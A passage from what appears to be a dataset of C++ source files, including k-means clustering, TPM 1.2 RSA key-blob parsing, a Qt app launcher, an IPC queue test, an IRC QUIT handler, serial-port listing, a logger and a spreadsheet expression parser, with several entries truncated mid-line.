}\n                    return sum;\n                }\n            );\n        }\n\n        double sum = 0.0;\n        for (int t = 0; t < pool.threadCount(); t++) {\n            done[t].wait();\n            sum += done[t].get();\n        }\n\n        return sum;\n    };\n\n    N.resize(clusters);\n    for (int i = 0; i < clusters; ++i)\n        N[i] = 0;\n        \n    centers = cv::Mat(clusters, desc.cols, CV_32F);\n    centers = 0;\n\n    std::random_device rd;\n\tstd::mt19937 gen(rd());\n\tstd::uniform_int_distribution<int> distribution(0, desc.rows - 1);\n    std::uniform_real_distribution<float> fdistribution(0.0, 1.0);\n    desc.row(distribution(gen)).copyTo(centers.row(0));\n\n    size_t numInitClusters = 1;\n    std::vector<double> distances;\n    for (int j = 1; j < clusters; ++j) {\n        size_t index = 0;\n        const double probability = fdistribution(gen);\n        double sum = distance(numInitClusters, desc, distances) * probability;\n        while (sum > 0.0) {\n            sum -= distances[index++];\n        }\n\n        desc.row(std::min(index, static_cast<size_t>(desc.rows) - 1)).copyTo(centers.row(j));\n        numInitClusters++;\n    }\n}\n\nvoid MiniBatchKMeans::fit(cv::Mat& desc) {\n    if (!initialized) {\n        initialized = true;\n        interna_improvement = 0;\n        min_interna = std::numeric_limits<double>::max();\n        initClusters(desc);\n    }\n\n    thread_pool& pool = thread_pool::instance();\n    std::vector<std::future<bool>> done;\n    done.resize(pool.threadCount());\n\n    std::vector<uint8_t> labels;\n    labels.resize(std::min(desc.rows, batchSize));\n    if (iteration == 0) {\n        approxSampleCount += desc.rows;\n    }\n\n    // compute distances and cluster indices\n    for (int t = 0; t < pool.threadCount(); ++t) {\n        const size_t count = std::ceil(static_cast<double>(labels.size()) / pool.threadCount());\n        const size_t start = t * count;\n        const size_t end   = std::min((t + 1) * count, (size_t)labels.size());\n\n        done[t] = pool.enqueue_task(\n            [this, start, end, &labels, &desc]() {\n                for (size_t j = start; j < end; ++j) {\n                    const cv::Mat row = desc.row(j);\n\n                    size_t index = 0;\n                    double distance = std::numeric_li",
    "/*++\n\nTHIS CODE AND INFORMATION IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF\nANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A\nPARTICULAR PURPOSE.\n\nCopyright (c) Microsoft Corporation.  All rights reserved.\n\nModule Name:\n\n    TPM12.cpp\n\nAbstract:\n\n    This file contains TPM 1.2 specific functions.\n\n--*/\n\n#include \"stdafx.h\"\n\nHRESULT\nGetKeyHandleFromPubKeyBlob12(\n    _In_reads_(cbKeyBlob) PBYTE pbKeyBlob,\n    UINT32 cbKeyBlob,\n    BCRYPT_ALG_HANDLE hAlg,\n    _Out_ BCRYPT_KEY_HANDLE* phPubKey,\n    _Out_opt_ PUINT32 pcbTrailing\n    )\n{\n    HRESULT hr = S_OK;\n    UINT32 cursor = 0;\n    UINT32 cbRsaPubKey = 0;\n    PBYTE pbRsaPubKey = NULL;\n    BCRYPT_RSAKEY_BLOB* RsaPubKey = NULL;\n    BYTE defaultExponent[] = {0x01, 0x00, 0x01};\n    UINT32 algorithmID = 0;\n    UINT32 keyLength = 0;\n    UINT32 numPrimes = 0;\n    UINT32 cbExponent = 0;\n    PBYTE pbExponent = NULL;\n    UINT32 cbPubKey = 0;\n    PBYTE pbPubKey = NULL;\n\n    if((hAlg == NULL) ||\n       (phPubKey == NULL) ||\n       (pbKeyBlob == NULL) ||\n       (cbKeyBlob == 0))\n    {\n        hr = E_INVALIDARG;\n        goto Cleanup;\n    }\n\n    // Unpack key structure\n    if(FAILED(hr = ReadBigEndian(pbKeyBlob, cbKeyBlob, &cursor, &algorithmID)))\n    {\n        goto Cleanup;\n    }\n    if(algorithmID != 0x00000001) //TPM_ALG_RSA\n    {\n        hr = E_INVALIDARG;\n        goto Cleanup;\n    }\n\n    if(FAILED(hr = SkipBigEndian(pbKeyBlob, cbKeyBlob, &cursor, sizeof(UINT16) +  // encScheme\n                                                                sizeof(UINT16) +  // sigScheme\n                                                                sizeof(UINT32)))) // parmSize\n    {\n        goto Cleanup;\n    }\n    if(FAILED(hr = ReadBigEndian(pbKeyBlob, cbKeyBlob, &cursor, &keyLength)))\n    {\n        goto Cleanup;\n    }\n\n    if(FAILED(hr = ReadBigEndian(pbKeyBlob, cbKeyBlob, &cursor, &numPrimes)))\n    {\n        goto Cleanup;\n    }\n    if(numPrimes != 2)\n    {\n        hr = E_INVALIDARG;\n        goto Cleanup;\n    }\n\n    if(FAILED(hr = ReadBigEndian(pbKeyBlob, cbKeyBlob, &cursor, &cbExponent)))\n    {\n        goto Cleanup;\n    }\n    if(cbExponent != 0)\n    {\n        if(FAILED(hr = ReadBigEndian(pbKeyBlob, cbKeyBlob, &cursor, &pbExponent, cbExponent)))\n        {\n            goto Cleanup;\n        }\n    }\n    else\n    {\n        pbExponent = defaultExponent;\n        cbExponent = sizeof(defaultExponent);\n    }\n\n    if(FAILED(hr = ReadBigEndian(pbKeyBlob, cbKeyBlob, &cursor, &cbPubKey)))\n    {\n        goto Cleanup;\n    }\n    if(cbPubKey != 0)\n    {\n        if(FAILED(hr = ReadBigEndian(pbKeyBlob, cbKeyBlob, &cursor, &pbPubKey, cbPubKey)))\n        {\n            goto Cleanup;\n        }\n    }\n\n    // Create a BCRYPT inport key buffer from the data\n    cbRsaPubKey = sizeof(BCRYPT_RSAKEY_BLOB) +\n                  cbExponent +\n                  cbPubKey;\n    if(FAILED(hr = AllocateAndZero((PVOID*)&pbRsaPubKey, cbRsaPubKey)))\n    {\n        goto Cleanup;\n    }\n    RsaPubKey = (BCRYPT_RSAKEY_BLOB*) pbRsaPubKey;\n    RsaPubKey->Magic = BCRYPT_RSAPUBLIC_MAGIC;\n    RsaPubKey->BitLength = keyLength;\n    RsaPubKey->cbPublicExp = cbExponent;\n    RsaPubKey->cbModulus = cbPubKey;\n    if(memcpy_s(&pbRsaPubKey[sizeof(BCRYPT_RSAKEY_BLOB)], cbRsaPubKey - sizeof(BCRYPT_RSAKEY_BLOB), pbExponent, cbExponent))\n    {\n        hr = E_FAIL;\n        goto Cleanup;\n    }\n    if(memcpy_s(&pbRsaPubKey[sizeof(BCRYPT_RSAKEY_BLOB) + RsaPubKey->cbPublicExp], cbRsaPubKey - (sizeof(BCRYPT_RSAKEY_BLOB) + RsaPubKey->cbPublicExp), pbPubKey, cbPubKey))\n    {\n        hr = E_FAIL;\n        goto Cleanup;\n    }\n\n    // Load the key\n    if(FAILED(hr = HRESULT_FROM_NT(BCryptImportKeyPair(\n                                        hAlg,\n                                        NULL,\n                                        BCRYPT_RSAPUBLIC_BLOB,\n                                        phPubKey,\n                                        pbRsaPubKey,\n                                        cbRsaPubKey,\n                                        0))))\n    {\n        goto Cleanup;\n    }\n\n    // Return the index of the training data if requested\n    if(pcbTrailing != NULL)\n    {\n        *pcbTrailing = cursor;\n    }\n\nCleanup:\n    ZeroAndFree((PVOID*)&pbRsaPubKey, cbRsaPubKey);\n    return hr;\n}\n\nHRESULT\nGetKeyHandleFromKeyBlob12(\n    _In_reads_(cbKeyBlob) PBYTE pbKeyBlob,\n    UINT32 cbKeyBlob,\n    BCRYPT_ALG_HANDLE hAlg,\n    _Out_ BCRYPT_KEY_HANDLE* phPubKey,\n    _Out_opt_ PUINT32 pcbTrailing\n    )\n{\n    HRESULT hr = S_OK;\n    UINT32 cursor = 0;\n    UINT32 cbRsaPubKey = 0;\n    PBYTE pbRsaPubKey = NULL;\n    BCRYPT_RSAKEY_BLOB* RsaPubKey = NULL;\n    BYTE defaultExponent[] = {0x01, 0x00, 0x01};\n    UINT32 algorithmID = 0;\n    UINT32 keyLength = 0;\n    UINT32 numPrimes = 0;\n    UINT32 cbExponent = 0;\n    PBYTE pbExponent = NULL;\n    UINT32 pcrInfoSize = 0;\n    UINT32 cbPubKey = 0;\n    PBYTE pbPubKey = NULL;\n\n    if((hAlg == NULL) ||\n       (phPubKey == NULL) ||\n       (pbKeyBlob == NULL) ||",
    "/*\n * SPDX-FileCopyrightText: 2024 George Florea B\u0103nu\u0219 <georgefb899@gmail.com>\n *\n * SPDX-License-Identifier: GPL-3.0-or-later\n */\n\n#include <QCommandLineParser>\n#include <QGuiApplication>\n#include <QIcon>\n#include <QQmlApplicationEngine>\n#include <QQmlContext>\n#include <QQmlPropertyMap>\n#include <QQuickStyle>\n\n#include \"mangaimageprovider.h\"\n\nint main(int argc, char *argv[])\n{\n    auto startTime = QDateTime::currentMSecsSinceEpoch();\n    qSetMessagePattern(QStringLiteral(\"%{time [hh:mm:ss.zzz]}: %{message}\"));\n\n    QGuiApplication::setDesktopFileName(QStringLiteral(\"com.georgefb.rakki\"));\n\n    QGuiApplication app(argc, argv);\n    app.setOrganizationName(QStringLiteral(\"georgefb\"));\n    app.setApplicationName(QStringLiteral(\"rakki\"));\n    QGuiApplication::setWindowIcon(QIcon::fromTheme(QStringLiteral(\"rakki\")));\n\n    QCommandLineParser clParser;\n    clParser.process(app);\n    QString file;\n    if (clParser.positionalArguments().size() > 0) {\n        file = clParser.positionalArguments().first();\n    }\n\n    QQmlApplicationEngine engine(&app);\n    const QUrl url(QStringLiteral(\"qrc:/qt/qml/com/georgefb/rakki/qml/main.qml\"));\n    auto onObjectCreated = [url](const QObject *obj, const QUrl &objUrl) {\n        if (!obj && url == objUrl) {\n            QCoreApplication::exit(-1);\n        }\n    };\n    QObject::connect(&engine, &QQmlApplicationEngine::objectCreated, &app, onObjectCreated, Qt::QueuedConnection);\n\n    engine.addImageProvider(QStringLiteral(\"manga\"), new MangaImageProvider());\n\n    engine.rootContext()->setContextProperty(QStringLiteral(\"startupTime\"), startTime);\n    engine.rootContext()->setContextProperty(QStringLiteral(\"ctxFile\"), file);\n\n    engine.load(url);\n\n    qDebug() << \"execution time:\" << QDateTime::currentMSecsSinceEpoch() - startTime;\n\n    return app.exec();\n}\n",
    "#include <ipc/spsc_queue.hpp>\n#include <ipc/semaphore.hpp>\n#include <ipc/shared_memory.hpp>\n\n#include <array>\n#include <cassert>\n#include <iostream>\n\nstruct TestQueueEntry {\n\tsize_t num1 {0};\n\tstd::array<uint8_t, 64> data;\n\tstatic_assert(sizeof(data) >= sizeof(uint8_t)*64);\n};\n\nstatic constexpr size_t queue_capacity {128};\n\nint main(void) {\n\t{ // very simple, same process, same thread\n\t\tstatic constexpr size_t shared_memory_size_minimum {IPCSPSCQueue<TestQueueEntry>::neededSharedSize(queue_capacity)};\n\n\t\t// producer\n\t\t// create\n\t\tIPCSharedMemory prod_mem(\"test_queue1_mem_name_xxx\", shared_memory_size_minimum, true);\n\t\tassert(prod_mem.isOpen());\n\t\tstd::cout << \"created prod_mem\\n\";\n\n\t\tIPCSemaphore prod_sem_w_idx(\"test_queue1_sem_w_idx_name_xxx\", true, 1);\n\t\tassert(prod_sem_w_idx.isOpen());\n\t\tstd::cout << \"created prod_sem_w_idx\\n\";\n\n\t\tIPCSemaphore prod_sem_r_idx(\"test_queue1_sem_r_idx_name_xxx\", true, 1);\n\t\tassert(prod_sem_r_idx.isOpen());\n\t\tstd::cout << \"created prod_sem_r_idx\\n\";\n\n\t\tIPCSPSCQueue<TestQueueEntry> prod_queue(queue_capacity, prod_mem, prod_sem_w_idx, prod_sem_r_idx);\n\t\tassert(prod_queue.isConnected());\n\t\tprod_queue.init(); // TODO: make this more pretty\n\n\t\t// consumer\n\t\t// open\n\t\tIPCSharedMemory cons_mem(\"test_queue1_mem_name_xxx\", shared_memory_size_minimum);\n\t\tassert(cons_mem.isOpen());\n\t\tstd::cout << \"opened cons_mem\\n\";\n\n\t\tIPCSemaphore cons_sem_w_idx(\"test_queue1_sem_w_idx_name_xxx\", true, 1);\n\t\tassert(cons_sem_w_idx.isOpen());\n\t\tstd::cout << \"opened cons_sem_w_idx\\n\";\n\n\t\tIPCSemaphore cons_sem_r_idx(\"test_queue1_sem_r_idx_name_xxx\", true, 1);\n\t\tassert(cons_sem_r_idx.isOpen());\n\t\tstd::cout << \"opened cons_sem_r_idx\\n\";\n\n\t\tIPCSPSCQueue<TestQueueEntry> cons_queue(queue_capacity, cons_mem, cons_sem_w_idx, cons_sem_r_idx);\n\t\tassert(cons_queue.isConnected());\n\n\n\t\t// all set up\n\n\t\t{ // push empty into producer\n\t\t\tconst auto push_ret = prod_queue.try_push({});\n\t\t\tassert(push_ret == true);\n\t\t\tassert(prod_queue.size() == 1);\n\t\t\tassert(cons_queue.size() == 1);\n\t\t\tassert(cons_queue.front() != nullptr);\n\t\t\tcons_queue.pop();\n\t\t\tassert(prod_queue.size() == 0);\n\t\t\tassert(cons_queue.size() == 0);\n\t\t}\n\n\t\t{ // push magic number\n\t\t\tconst auto push_ret = prod_queue.try_push({1337, {}});\n\t\t\tassert(push_ret == true);\n\t\t\tassert(prod_queue.size() == 1);\n\t\t\tassert(cons_queue.size() == 1);\n\t\t\t{\n\t\t\t\tconst auto* element = cons_queue.front();\n\t\t\t\tassert(element != nullptr);\n\t\t\t\tassert(element->num1 == 1337);\n\t\t\t}\n\t\t\tcons_queue.pop();\n\t\t}\n\n\t\t{ // simple sequential push pop > capacity\n\t\t\tfor (size_t i = 0; i < queue_capacity*20; i++) {\n\t\t\t\tconst auto push_ret = prod_queue.try_push({1337+i, {}});\n\t\t\t\tassert(push_ret == true);\n\t\t\t\tassert(prod_queue.size() == 1);\n\t\t\t\tassert(cons_queue.size() == 1);\n\t\t\t\t{\n\t\t\t\t\tconst auto* element = cons_queue.front();\n\t\t\t\t\tassert(element != nullptr);\n\t\t\t\t\tassert(element->num1 == 1337+i);\n\t\t\t\t}\n\t\t\t\tcons_queue.pop();\n\t\t\t}\n\t\t}\n\n\t\t{ // fill queue to max\n\t\t\t// TODO: due to the fill state logic, the last slot can not be filled\n\t\t\tfor (size_t i = 0; i < queue_capacity-1; i++) {\n\t\t\t\tconst auto push_ret = prod_queue.try_push({1337+i, {}});\n\t\t\t\tassert(push_ret == true);\n\t\t\t\tassert(prod_queue.size() == i+1);\n\t\t\t\tassert(cons_queue.size() == i+1);\n\t\t\t}\n\n\t\t\tconst auto push_ret = prod_queue.try_push({42, {}});\n\t\t\tassert(push_ret == false);\n\n\t\t\tfor (size_t i = 0; i < queue_capacity-1; i++) {\n\t\t\t\tconst auto* element = cons_queue.front();\n\t\t\t\tassert(element != nullptr);\n\t\t\t\tcons_queue.pop();\n\t\t\t}\n\n\t\t\tassert(cons_queue.size() == 0);\n\t\t\tassert(cons_queue.front() == nullptr);\n\t\t}\n\t}\n\n\treturn 0;\n}\n\n",
    "#include \"../../include/core/Executor.hpp\"\n#include \"../../include/core/Server.hpp\"\n\n// QUIT \ud30c\uc2f1\nvoid Executor::parseQUIT(std::vector<std::string>& cmds, std::string& msg)\n{\n\tcmds.push_back(\"QUIT\");\n\tint i = 4;\n\tint size = msg.size();\n\n\t// QUIT \ub2e4\uc74c \uacf5\ubc31 \ub2e4 \ub118\uae30\uae30\n\twhile (i < size && msg[i] == ' ')\n\t\ti++;\n\n\t// ':'\uac00 \uc788\uc73c\uba74 index 1 \uc99d\uac00\n\tif (i < size && msg[i] == ':')\n\t\ti++;\n\t\n\t// \ub4a4\uc5d0 \ub0b4\uc6a9\uc774 \uc788\ub294\uacbd\uc6b0 \ud55c\ubc88\uc5d0 \ub2f4\uae30\n\tif (i < size)\n\t\tcmds.push_back(msg.substr(i));\n\telse\n\t\tcmds.push_back(\"\");\n}\n\n// QUIT \uc2e4\ud589\nvoid Executor::QUIT(Client& client, std::vector<std::string>& cmds)\n{\n\t// message\uac00 \uc5c6\uc73c\uba74 default message\uc778 nick\uc73c\ub85c message \ucd94\uac00\n\tif (cmds.size() == 1)\n\t\tcmds.push_back(client.getNick());\n\t\n\t// \ud074\ub77c\uc774\uc5b8\ud2b8\uac00 \ucc38\uc5ec\ud55c \ubaa8\ub4e0 \ucc44\ub110\uc5d0 \uc788\ub294 \uc0ac\ub78c\uc5d0\uac8c \uba54\uc2dc\uc9c0 \uc804\ub2ec (\ubcf8\uc778 \ube7c\uace0)\n\t// \ubaa8\ub4e0 \ucc44\ub110\uc5d0 \uc788\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8\ub4e4\uc758 fd \uc218\uc9d1\n\tstd::set<Client*> set;\n\tstd::vector<Channel*> joinedChannels = client.getJoinedChannels();\n\tfor (int i = 0; i < static_cast<int>(joinedChannels.size()); i++)\n\t\tjoinedChannels[i]->fillSet(set);\n\tset.erase(&client); // \ubcf8\uc778 \ube7c\uace0\n\n\t// \uba54\uc2dc\uc9c0 \ub9cc\ub4e4\uae30\n\tstd::string msg = ServerMsg::QUITMSGTOCHANNEL(client.getNick(), client.getHostName(),\n\t\t\t\t\t\t\t\t\t\t\t client.getServerName(), cmds[1]);\n\t\n\t// \uba54\uc2dc\uc9c0 \uc800\uc7a5\n\tstd::set<Client*>::iterator iter;\n\tfor (iter = set.begin(); iter != set.end(); iter++)\n\t\t(*iter)->addToSendBuf(msg);\n\n\t// \ub098\uac00\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8\uc5d0\uac8c \uba54\uc2dc\uc9c0\uc800\uc7a5\n\tclient.addToSendBuf(ServerMsg::QUITCHANNEL(client.getHostName(), client.getServerName(), cmds[1]));\n\n\t// \uc5f0\uacb0 \uc885\ub8cc \ud50c\ub798\uadf8 on\n\tclient.setQuitFlag(true);\n}\n",
    "#include \"ser.h\"\n#include <stdexcept>\n\n#ifdef _WIN32\n#include <Windows.h>\n#include <SetupAPI.h>\n#else\n#include <termios.h>\n#include <filesystem>\n#endif\n\nnamespace ser {\n    std::vector<std::string> list() {\n        std::vector<std::string> ports;\n\n#ifdef _WIN32\n        // Get the list of com ports\n        HDEVINFO info = SetupDiGetClassDevsA(&GUID_CLASS_COMPORT, NULL, NULL, DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);\n        if (info == INVALID_HANDLE_VALUE) {\n            throw std::runtime_error(\"Could not list serial ports\");\n        }\n\n        // Iterate through devices\n        int count = 0;\n        for (int i = 0;; i++) {\n            // Get the interface data\n            SP_DEVICE_INTERFACE_DATA data = {};\n            data.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);\n            if (!SetupDiEnumDeviceInterfaces(info, NULL, &GUID_CLASS_COMPORT, i, &data)) { break; }\n\n            printf(\"Found\\n\");\n\n            // Get the required size\n            DWORD requiredSize;\n            SetupDiGetDeviceInterfaceDetailA(info, &data, NULL, NULL, &requiredSize, NULL);\n\n            // Get the device path\n            int dataLen = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_A) + requiredSize;\n            PSP_DEVICE_INTERFACE_DETAIL_DATA_A detailedData = (PSP_DEVICE_INTERFACE_DETAIL_DATA_A)malloc(dataLen);\n            memset(detailedData, 0, dataLen);\n            detailedData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_A);\n            if (!SetupDiGetDeviceInterfaceDetailA(info, &data, detailedData, dataLen, NULL, NULL)) {\n                printf(\"Last error: %d\\n\", GetLastError());\n                continue;\n            }\n            std::string path(detailedData->DevicePath); // TF is this?\n\n            // Add path to the list\n            ports.push_back(std::string(detailedData->DevicePath)); // why isn't it used here?\n\n            // Free the detailed data\n            free(detailedData);\n        }\n\n        // Free the device list\n        SetupDiDestroyDeviceInfoList(info);\n#else\n        // List all terminal devices\n        auto sysTTY = std::filesystem::path(\"/sys/class/tty\");\n        auto ttys = std::filesystem::directory_iterator(sysTTY);\n        for (const auto& tty : ttys) {\n            // Skip if not a directory\n            if (!tty.is_directory()) { continue; }\n\n            // Skip if not linked with a device\n            if (!std::filesystem::exists(sysTTY / tty / \"device\")) { continue; }\n\n            // Save to list\n            ports.push_back(tty.path().filename());\n        }\n#endif\n\n        return ports;\n    }\n}",
    "#include \"Logger.h\"\n\n\nstd::string GetFileName(const std::string& path) {\n\t// Encontra a \u00faltima ocorr\u00eancia do caractere de barra invertida\n\tsize_t pos = path.find_last_of(\"\\\\\");\n\tif (pos != std::string::npos) {\n\t\t// Retorna a parte da string a partir dessa posi\u00e7\u00e3o\n\t\treturn path.substr(pos);\n\t}\n\telse {\n\t\t// Se n\u00e3o houver nenhuma ocorr\u00eancia, retorna o caminho completo\n\t\treturn path;\n\t}\n}\n\nstd::string CurrentDataTimeToString() {\n\tstd::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());\n\tstd::string output(30, '\\0');\n\tstruct tm timeinfo;\n\tif (localtime_s(&timeinfo, &now) == 0) {\n\t\tstd::strftime(&output[0], output.size(), \"%d/%b/%Y %H:%M:%S\", &timeinfo);\n\t}\n\treturn output;\n}\n\nvoid Logger::Info(const std::string& message, const char* file, int line) {\n\n\tstd::cout << CurrentDataTimeToString();\n\tstd::cout << ANSI_COLOR_GREEN << \" INFO \" << ANSI_COLOR_RESET;\n\tstd::cout << ANSI_COLOR_GREY << GetFileName(file) << \":\" << line << \": \" << ANSI_COLOR_RESET;\n\tstd::cout << message << std::endl;\n}\n\nvoid Logger::Warning(const std::string& message, const char* file, int line) {\n\tstd::cout << CurrentDataTimeToString();\n\tstd::cout << ANSI_COLOR_YELLOW << \" WARN \" << ANSI_COLOR_RESET;\n\tstd::cout << ANSI_COLOR_GREY << GetFileName(file) << \":\" << line << \": \" << ANSI_COLOR_RESET;\n\tstd::cout << message << std::endl;\n}\n\nvoid Logger::Error(const std::string& message, const char* file, int line) {\n\tstd::cout << CurrentDataTimeToString();\n\tstd::cout << ANSI_COLOR_RED << \" ERRO \" << ANSI_COLOR_RESET;\n\tstd::cout << ANSI_COLOR_GREY << GetFileName(file) << \":\" << line << \": \" << ANSI_COLOR_RESET;\n\tstd::cout << message << std::endl;\n}",
    "#include \"excel.h\"\n#include <fstream>\n\nnamespace MyExcel {\n\tVector::Vector(int n) : data(new string[n]), capacity(n), length(0) {}\n\tvoid Vector::push_back(string s) {\n\t\tif (capacity <= length) {\n\t\t\tstring* tmp = new string[capacity * 2];\n\t\t\tfor (int i = 0; i < length; i++) {\n\t\t\t\ttmp[i] = data[i];\n\t\t\t}\n\t\t\tdelete[] data;\n\t\t\tdata = tmp;\n\t\t\tcapacity *= 2;\n\t\t}\n\t\tdata[length] = s;\n\t\tlength++;\n\t}\n\tstring Vector::operator[](int i) { return data[i]; }\n\tvoid Vector::remove(int x) {\n\t\tfor (int i = x + 1; i < length; i++) {\n\t\t\tdata[i - 1] = data[i];\n\t\t}\n\t\tlength--;\n\t}\n\tint Vector::size() { return length; }\n\tVector::~Vector() {\n\t\tif (data) {\n\t\t\tdelete[] data;\n\t\t}\n\t}\n\n\tStack::Stack() : start(NULL, \"\") { current = &start; }\n\tvoid Stack::push(string s) {\n\t\tNode* n = new Node(current, s);\n\t\tcurrent = n;\n\t}\n\tstring Stack::pop() {\n\t\tif (current == &start)\n\t\t\treturn \"\";\n\n\t\tstring s = current->s;\n\t\tNode* prev = current;\n\t\tcurrent = current->prev;\n\n\t\tdelete prev;\n\t\treturn s;\n\t}\n\tstring Stack::peek() { return current->s; }\n\tbool Stack::is_empty() {\n\t\tif (current == &start)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\tStack::~Stack() {\n\t\twhile (current != &start) {\n\t\t\tNode* prev = current;\n\t\t\tcurrent = current->prev;\n\t\t\tdelete prev;\n\t\t}\n\t}\n\tNumStack::NumStack() : start(NULL, 0) { current = &start; }\n\tvoid NumStack::push(double s) {\n\t\tNode* n = new Node(current, s);\n\t\tcurrent = n;\n\t}\n\tdouble NumStack::pop() {\n\t\tif (current == &start)\n\t\t\treturn 0;\n\n\t\tdouble s = current->s;\n\t\tNode* prev = current;\n\t\tcurrent = current->prev;\n\n\t\tdelete prev;\n\t\treturn s;\n\t}\n\tdouble NumStack::peek() { return current->s; }\n\tbool NumStack::is_empty() {\n\t\tif (current == &start)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\tNumStack::~NumStack() {\n\t\twhile (current != &start) {\n\t\t\tNode* prev = current;\n\t\t\tcurrent = current->prev;\n\t\t\tdelete prev;\n\t\t}\n\t}\n\n\t// Myexcel\n\t// Cell \ud074\ub798\uc2a4(\ucd94\uc0c1_) \n\tCell::Cell(int x, int y, Table* table)\n\t\t: x(x), y(y), table(table) {}\n\n\t// StringCell\n\tStringCell::StringCell(string data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t) {}\n\tstring StringCell::stringify() { return data; }\n\tint StringCell::to_numeric() { return 0; }\n\n\t// NumberCell\n\tNumberCell::NumberCell(int data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t) {}\n\tstring NumberCell::stringify() { return to_string(data); }\n\tint NumberCell::to_numeric() { return data; }\n\n\t// *** DateCell\n\tDateCell::DateCell(string s, int x, int y, Table* t) : Cell(x, y, t) {\n\t\t// Date format => yyyy-mm-dd\n\t\t// time_t \uac12\uc73c\ub85c \ubcc0\ud658\ud560 \ub0a0\uc9dc\n\t\tint year = atoi(s.c_str());\n\t\tint month = atoi(s.c_str()+5);\n\t\tint day = atoi(s.c_str()+8);\n\n\t\t// struct tm(tm \uad6c\uc870\uccb4) : \uc0ac\ub78c\uc774 \uc0ac\uc6a9\ud558\ub294 \ub0a0\uc9dc \uac1c\ub150 \uc801\uc6a9\ud55c \uad6c\uc870\uccb4\n\t\ttm timeinfo;\n\n\t\ttimeinfo.tm_year = year - 1900;\n\t\ttimeinfo.tm_mon = month - 1;\n\t\ttimeinfo.tm_mday = day;\n\t\ttimeinfo.tm_hour = 0;\n\t\ttimeinfo.tm_min = 0;\n\t\ttimeinfo.tm_sec = 0;\n\n\t\t// tm -> time_t \uac12\uc73c\ub85c \ubcc0\ud658\n\t\tdata = mktime(&timeinfo); \n\t}\n\n\tstring DateCell::stringify() {\n\t\tchar buf[50];\n\t\ttm temp;\n\t\t// localtime_s : \uc2e4\ud589 \uc2dc\uc810\uc758 \uac12\n\t\t// time_t \ud615\uc2dd\uc744 \ub144\uc6d4\uc77c\uc2dc\ubd84\ucd08 \ud615\ud0dc\ub85c \ubd84\ud560\ud55c \uc77c\uc2dc(struct tm \ud615\uc2dd)\ub85c \ubcc0\ud658\n\t\t// \uba64\ubc84\uac00 \uc788\ub294 tm \uad6c\uc870\uccb4\uc5d0 \ub300\ud55c \ud3ec\uc778\ud130 \ubc18\ud658\n\t\tlocaltime_s(&temp, &data);\n\t\t// string\uc73c\ub85c \ubc18\ud658\n\t\t// %F => ISO \ub0a0\uc9dc \ud615\uc2dd(%Y-%m-%d\uc640 \ub3d9\uc77c).\n\t\tstrftime(buf, 50, \"%F\", &temp);\n\n\t\treturn string(buf);\n\t}\n\n\tint DateCell::to_numeric() {\n\t\t// \ud0c0\uc785 \uce90\uc2a4\ud2b8 \uc5f0\uc0b0\uc790\n\t\treturn static_cast<int>(data);\n\t}\n\n\tExprCell::ExprCell(string data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t), parsed_expr(new MyExcel::Vector()) {\n\t\t// \uc0dd\uc131\uc790\uc5d0\uc11c \uc218\uc2dd\uc744 \ud30c\uc2f1\ud558\uc5ec exp_vec \uc5d0 \uc800\uc7a5\n\t\tparse_expression();\n\t}\n\n\tExprCell::~ExprCell() {\n\t\tif (parsed_expr) {\n\t\t\tdelete[] parsed_expr;\n\t\t\tparsed_expr = nullptr;\n\t\t}\n\t}\n\n\tint ExprCell::precedence(char c) {\n\t\tswitch (c) {\n\t\tcase '(':\n\t\tcase '[':\n\t\tcase '{':\n\t\t\treturn 0;\n\t\tcase '+':\n\t\tcase '-':\n\t\t\treturn 1;\n\t\tcase '*':\n\t\tcase '/':\n\t\t\treturn 2;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tvoid ExprCell::parse_expression() {\n\t\tStack stack;\n\t\t\n\t\t// \uc218\uc2dd \uc804\uccb4\ub97c ()\ub85c \ubb36\uace0 exp_vec \uc5d0 \ub0a8\uc544\uc788\ub294 \uc5f0\uc0b0\uc790\ub4e4\uc774 push \ub418\ub3c4\ub85d... (data \uac12)\n\t\tdata.insert(0, \"(\");\n\t\tdata.push_back(')');\t\t\n\n\t\tfor (int i = 0; i < data.length(); i++) {\n\t\t\t// isalpha : \uc54c\ud30c\ubcb3\uc778\uc9c0 => \ub300\ubd84\uc790\uba74 1, \uc18c\ubb38\uc790\uba74 2, \uc544\ub2c8\uba74 0 \ubc18\ud658\n\t\t\tif (isalpha(data[i])) {\n\t\t\t\texp_vec.push_back(data.substr(i, 2));\n\t\t\t\ti++;\n\t\t\t}\n\t\t\telse if (isdigit(data[i])) {\n\t\t\t\texp_vec.push_back(data.substr(i, 1));\n\t\t\t}\n\t\t\telse if (data[i] == '(' || data[i] == '[' || data[i] == '{') {\n\t\t\t\tstack.push(data.substr(i, 1));\n\t\t\t}\n\t\t\telse if (data[i] == ')' || data[i] == ']' || data[i] == '}') {\n\t\t\t\tstring t = stack.pop();\n\t\t\t\twhile (t != \"(\" && t != \"[\" && t != \"{\") {\n\t\t\t\t\texp_vec.push_back(t);\n\t\t\t\t\tt = stack.pop();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (data[i] == '+' || data[i] == '-' || data[i] == '*' || data[i] == '/') {\n\t\t\t\twhile (!stack.is_empty() && precedence(stack.peek()[0]) >= precedence(data[i])) {\n\t\t\t\t\texp_vec.push_back(stack.pop());\n\t\t\t\t}\n\t\t\t\tstack.push(data.substr(i, 1));\n\t\t\t}\n\t\t}\t\t\n\t\t// parsed_expr \uc5d0 exp_vec \uc8fc\uc18c \ud560\ub2f9 =================================================================================>>>>\n\t\t// std::string* Myexcel::ExprCell << Myexcel::Vector Myexcel::ExprCell\t\t\n\t\t// ==> parsed_expr\ub97c Vector* \ub85c \ubc14\uafc8 (excel.h \ud655\uc778)\n\t\t\n\t\tparsed_expr = 